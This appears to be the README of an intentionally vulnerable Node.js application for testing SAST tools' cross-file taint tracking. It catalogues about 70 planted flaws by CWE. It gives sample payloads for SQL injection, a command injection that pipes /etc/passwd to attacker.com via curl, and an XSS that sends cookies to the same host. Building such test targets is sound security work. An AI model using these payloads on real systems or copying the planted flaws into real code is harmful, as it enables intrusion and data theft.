# Vulnerable Node.js Application
## For SAST Tool Testing Purposes Only

> ⚠️ **WARNING: DO NOT DEPLOY THIS APPLICATION IN ANY REAL ENVIRONMENT**
> This application contains intentional security vulnerabilities for testing SAST tools.

---

## Multi-File Source-to-Sink Flows

These flows are specifically designed to test a SAST engine's **cross-file taint tracking** capability. Each flow involves a tainted value that originates in one file, propagates through one or more intermediate files, and terminates at a sink in a different file.

### Flow A — SQL Injection (3 files)

| Step | Role | File | Symbol | Notes |
|------|------|------|--------|-------|
| 1 | **Source** | `src/routes/search.js` | `req.query.q`, `req.query.category`, `req.query.role` | User-controlled HTTP query params |
| 2 | **Transit** | `src/utils/helpers.js` | `helpers.buildQuery(table, conditions)` | Concatenates `col = 'val'` pairs into raw SQL; returns tainted string |
| 3 | **Sink** | `src/models/db.js` | `db.executeRaw(sql)` / `db.executeRawAsync(sql)` | Calls `connection.query(sql)` — SQL executed against MySQL |

Endpoints: `GET /search/products`, `GET /search/users`, `GET /search/orders`

Attack example:
```
GET /search/products?q=widget&category=' OR '1'='1
```

---

### Flow B — OS Command Injection (3 files)

| Step | Role | File | Symbol | Notes |
|------|------|------|--------|-------|
| 1 | **Source** | `src/routes/files.js` | `req.body.inputFile`, `req.body.outputFormat`, `req.body.quality` | User-controlled POST body fields |
| 2 | **Transit** | `src/utils/vulnerable.ts` | `executeCommand(cmd: ShellCommand)` | Joins `cmd.args` array with spaces — no shell escaping |
| 3 | **Sink** | `src/utils/vulnerable.ts` | `child_process.exec(fullCmd)` | OS executes the tainted command string |

Endpoints: `POST /files/convert-ts`, `POST /files/resize-ts`

Attack example:
```json
POST /files/convert-ts
{ "inputFile": "in.mp4; curl http://attacker.com/$(cat /etc/passwd)", "outputFormat": "mp4" }
```

---

### Flow C — Stored XSS (3 files)

| Step | Role | File | Symbol | Notes |
|------|------|------|--------|-------|
| 1 | **Source (store)** | `src/routes/users.js` | `req.body.bio`, `.website`, `.avatar`, `.errorHandler` | Stored to MongoDB without sanitization |
| 2 | **Transit** | `src/utils/helpers.js` | `helpers.generateUserCard(user)` | Interpolates stored fields into HTML template literals; no escaping |
| 3 | **Sink** | `src/routes/users.js` | `res.send(html)` in `GET /:id/bio` | Tainted HTML sent to browser — script executes |

Endpoints: `POST /users/:id/bio` (store), `GET /users/:id/bio` (trigger)

Attack example:
```json
POST /users/123/bio
{ "bio": "<img src=x onerror=alert(document.cookie)>", "errorHandler": "fetch('//attacker.com/'+document.cookie)" }
```

---

## Vulnerability Catalog

### Injection Vulnerabilities
| ID | CWE | Vulnerability | File | Line Area |
|----|-----|--------------|------|-----------|
| INJ-01 | CWE-89 | SQL Injection (Login) | `src/routes/auth.js` | POST /login |
| INJ-02 | CWE-89 | SQL Injection (Registration) | `src/routes/auth.js` | POST /register |
| INJ-03 | CWE-89 | SQL Injection (Password Reset) | `src/routes/auth.js` | POST /forgot-password |
| INJ-04 | CWE-89 | SQL Injection (ORDER BY) | `src/routes/api.js` | GET /products |
| INJ-05 | CWE-89 | SQL Injection (UNION attack) | `src/routes/admin.js` | GET /admin/users |
| INJ-06 | CWE-89 | Second-order SQL Injection | `src/routes/api.js` | GET /products/search |
| INJ-07 | CWE-943 | NoSQL Injection (MongoDB operator) | `src/routes/users.js` | POST /users/find |
| INJ-08 | CWE-943 | NoSQL Injection ($where) | `src/routes/users.js` | GET /users/search |
| INJ-09 | CWE-78 | OS Command Injection (exec) | `src/routes/files.js` | GET /files/preview |
| INJ-10 | CWE-78 | OS Command Injection (execSync) | `src/routes/files.js` | POST /files/resize |
| INJ-11 | CWE-78 | OS Command Injection (ping) | `src/routes/admin.js` | GET /admin/ping |
| INJ-12 | CWE-78 | OS Command Injection (dig) | `src/routes/admin.js` | GET /admin/dig |
| INJ-13 | CWE-78 | OS Command Injection (backup) | `src/routes/admin.js` | POST /admin/backup |
| INJ-14 | CWE-95 | Eval Injection | `server.js` | POST /calculate |
| INJ-15 | CWE-95 | Eval Injection (admin) | `src/routes/admin.js` | POST /admin/eval |
| INJ-16 | CWE-94 | Server-Side Template Injection (EJS) | `src/routes/users.js` | POST /users/render-template |
| INJ-17 | CWE-94 | Server-Side Template Injection (Handlebars) | `src/routes/api.js` | POST /api/render |
| INJ-18 | CWE-117 | Log Injection | `src/routes/admin.js` | POST /admin/log-event |

### Broken Authentication & Session Management
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| AUTH-01 | CWE-798 | Hardcoded Admin Credentials | `src/routes/auth.js` |
| AUTH-02 | CWE-347 | JWT Algorithm Confusion (none) | `src/routes/auth.js` |
| AUTH-03 | CWE-307 | No Rate Limiting / Brute Force | `src/routes/auth.js` |
| AUTH-04 | CWE-640 | Weak Password Reset Mechanism | `src/routes/auth.js` |
| AUTH-05 | CWE-614 | Insecure Session Cookie (no Secure flag) | `server.js` |
| AUTH-06 | CWE-1004 | Cookie without HttpOnly | `server.js` |
| AUTH-07 | CWE-306 | Missing Authentication on Critical Function | `src/routes/auth.js` |
| AUTH-08 | CWE-208 | Timing Attack (token comparison) | `server.js` |
| AUTH-09 | CWE-798 | Hardcoded Bypass Token | `src/middleware/auth.js` |
| AUTH-10 | CWE-284 | Debug Header Auth Bypass | `src/middleware/auth.js` |

### Sensitive Data Exposure
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| DATA-01 | CWE-312 | Plaintext Passwords in DB | `src/models/db.js`, `src/models/user.js` |
| DATA-02 | CWE-312 | SSN/Credit Card in Plaintext | `src/models/user.js` |
| DATA-03 | CWE-532 | Passwords Logged | `src/routes/auth.js` |
| DATA-04 | CWE-532 | Full Config/Env Logged | `src/config/config.js` |
| DATA-05 | CWE-200 | Stack Traces Exposed | `server.js` |
| DATA-06 | CWE-200 | Full process.env Exposed | `server.js` (/debug endpoint) |
| DATA-07 | CWE-200 | .env File Served Publicly | `server.js` (/config endpoint) |
| DATA-08 | CWE-598 | Credentials in URL Query Params | `src/routes/users.js` |
| DATA-09 | CWE-312 | Sensitive Data in JWT Payload | `src/utils/crypto.js` |
| DATA-10 | CWE-538 | Directory Listing Enabled | `server.js` |

### Cryptographic Failures
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| CRYPT-01 | CWE-327 | MD5 for Password Hashing | `src/utils/crypto.js` |
| CRYPT-02 | CWE-327 | SHA1 without Salt | `src/utils/crypto.js` |
| CRYPT-03 | CWE-327 | DES Encryption (Broken) | `src/utils/crypto.js` |
| CRYPT-04 | CWE-327 | RC4 Encryption (Broken) | `src/utils/crypto.js` |
| CRYPT-05 | CWE-327 | ECB Mode (No IV, pattern leakage) | `src/utils/crypto.js` |
| CRYPT-06 | CWE-329 | Static IV in CBC Mode | `src/utils/crypto.js` |
| CRYPT-07 | CWE-321 | Hardcoded Encryption Key | `src/utils/crypto.js` |
| CRYPT-08 | CWE-338 | Math.random() for Security Tokens | `src/utils/crypto.js` |
| CRYPT-09 | CWE-916 | bcrypt with only 4 rounds | `src/routes/auth.js` |
| CRYPT-10 | CWE-326 | 512-bit RSA Key | `src/utils/crypto.js` |
| CRYPT-11 | CWE-760 | Static Salt in PBKDF2 | `src/utils/crypto.js` |

### Access Control & Authorization
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| AC-01 | CWE-639 | IDOR - Get Any User | `src/routes/users.js` |
| AC-02 | CWE-639 | IDOR - Update Any User | `src/routes/users.js` |
| AC-03 | CWE-915 | Mass Assignment (register) | `src/routes/auth.js` |
| AC-04 | CWE-915 | Mass Assignment (profile update) | `src/routes/users.js` |
| AC-05 | CWE-862 | No Auth on Admin Routes | `src/routes/admin.js` |
| AC-06 | CWE-352 | No CSRF Protection | `src/middleware/auth.js` |
| AC-07 | CWE-346 | Permissive CORS (origin: *) | `server.js` |

### Security Misconfiguration
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| MISC-01 | CWE-693 | Missing Security Headers (no Helmet) | `server.js` |
| MISC-02 | CWE-16 | Debug Mode in Production | `.env`, `src/config/config.js` |
| MISC-03 | CWE-16 | multipleStatements: true in MySQL | `src/routes/auth.js` |
| MISC-04 | CWE-548 | Directory Listing via dotfiles: allow | `server.js` |
| MISC-05 | CWE-16 | SSL disabled for DB connections | `src/config/config.js` |
| MISC-06 | CWE-400 | No Request Size Limiting (500mb) | `server.js` |

### Server-Side Request Forgery (SSRF)
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| SSRF-01 | CWE-918 | SSRF via fetch-url | `src/routes/files.js` |
| SSRF-02 | CWE-918 | SSRF via webhook-test | `src/routes/admin.js` |
| SSRF-03 | CWE-918 | SSRF via GraphQL proxy | `src/routes/api.js` |

### File & Path Vulnerabilities
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| FILE-01 | CWE-434 | Unrestricted File Upload | `src/routes/files.js` |
| FILE-02 | CWE-22 | Path Traversal (file read) | `src/routes/files.js` |
| FILE-03 | CWE-22 | Path Traversal (file delete) | `src/routes/files.js` |
| FILE-04 | CWE-22 | Zip Slip | `src/routes/files.js` |
| FILE-05 | CWE-73 | Arbitrary File Write | `src/routes/files.js` |
| FILE-06 | CWE-377 | Insecure Temp Files | `src/routes/files.js` |

### Prototype Pollution
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| PROTO-01 | CWE-1321 | Prototype Pollution via merge | `server.js` |
| PROTO-02 | CWE-1321 | Prototype Pollution via lodash.merge | `src/routes/users.js` |
| PROTO-03 | CWE-1321 | Prototype Pollution via deepClone | `src/utils/helpers.js` |
| PROTO-04 | CWE-1321 | Prototype Pollution via deepMerge | `src/utils/helpers.js` |

### Deserialization
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| DESER-01 | CWE-502 | node-serialize RCE | `src/routes/users.js` |
| DESER-02 | CWE-502 | node-serialize via Cookie | `src/routes/admin.js` |
| DESER-03 | CWE-502 | Unsafe YAML load | `src/routes/api.js` |
| DESER-04 | CWE-502 | JSON reviver with eval | `src/utils/helpers.js` |

### DoS & Logic Flaws
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| DOS-01 | CWE-1333 | ReDoS (email regex) | `server.js`, `src/routes/api.js` |
| DOS-02 | CWE-400 | Uncontrolled bulk operations | `src/routes/users.js` |
| DOS-03 | CWE-190 | Integer overflow / negative prices | `src/routes/api.js` |
| DOS-04 | CWE-362 | Race condition (withdrawal) | `src/routes/api.js` |

### XSS Vulnerabilities
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| XSS-01 | CWE-79 | Reflected XSS (search) | `server.js` |
| XSS-02 | CWE-79 | Stored XSS (bio) | `src/routes/users.js` |
| XSS-03 | CWE-79 | DOM XSS (innerHTML) | `views/index.html` |
| XSS-04 | CWE-79 | DOM XSS (document.write) | `views/index.html` |
| XSS-05 | CWE-79 | DOM XSS (postMessage) | `views/index.html` |
| XSS-06 | CWE-79 | XSS via error message | `views/index.html` |

### TypeScript-Specific
| ID | CWE | Vulnerability | File |
|----|-----|--------------|------|
| TS-01 | CWE-20 | Unsafe 'any' type usage | `src/utils/vulnerable.ts` |
| TS-02 | CWE-704 | Unsafe type assertion | `src/utils/vulnerable.ts` |
| TS-03 | CWE-798 | Hardcoded credentials in TS | `src/utils/vulnerable.ts` |
| TS-04 | CWE-89 | SQL injection via typed params | `src/utils/vulnerable.ts` |
| TS-05 | CWE-78 | Command injection via typed interface | `src/routes/handlers.ts` |
| TS-06 | CWE-502 | eval in typed deserialize | `src/routes/handlers.ts` |
| TS-07 | CWE-915 | Mass assignment via spread | `src/routes/handlers.ts` |

---

## Total Vulnerability Count: 70+ distinct vulnerabilities across 15+ CWE categories

## File Structure
```
vulnerable-nodejs-app/
├── server.js              # Main app - XSS, eval, CRLF, ReDoS, open redirect
├── .env                   # Hardcoded secrets
├── package.json           # Dependencies (some old/vulnerable)
├── tsconfig.json          # TypeScript config
├── views/
│   └── index.html         # DOM XSS, CSRF, clickjacking
└── src/
    ├── routes/
    │   ├── auth.js         # SQLi, JWT issues, broken auth
    │   ├── users.js        # NoSQLi, IDOR, XSS, deserialization
    │   ├── files.js        # Path traversal, cmd injection, SSRF, upload
    │   ├── api.js          # SQLi, crypto, SSTI, ReDoS, race condition
    │   ├── admin.js        # RCE, cmd injection, no auth, SSRF
    │   └── handlers.ts     # TypeScript vulnerabilities
    ├── middleware/
    │   └── auth.js         # Weak JWT, bypass, CSRF issues
    ├── models/
    │   ├── user.js         # NoSQLi in model, plaintext passwords
    │   └── db.js           # SQLi helpers, hardcoded creds
    ├── utils/
    │   ├── crypto.js       # All crypto weaknesses
    │   ├── helpers.js      # Prototype pollution, eval, XSS, SQLi
    │   └── vulnerable.ts   # TypeScript-specific vulnerabilities
    └── config/
        └── config.js       # All hardcoded secrets
```
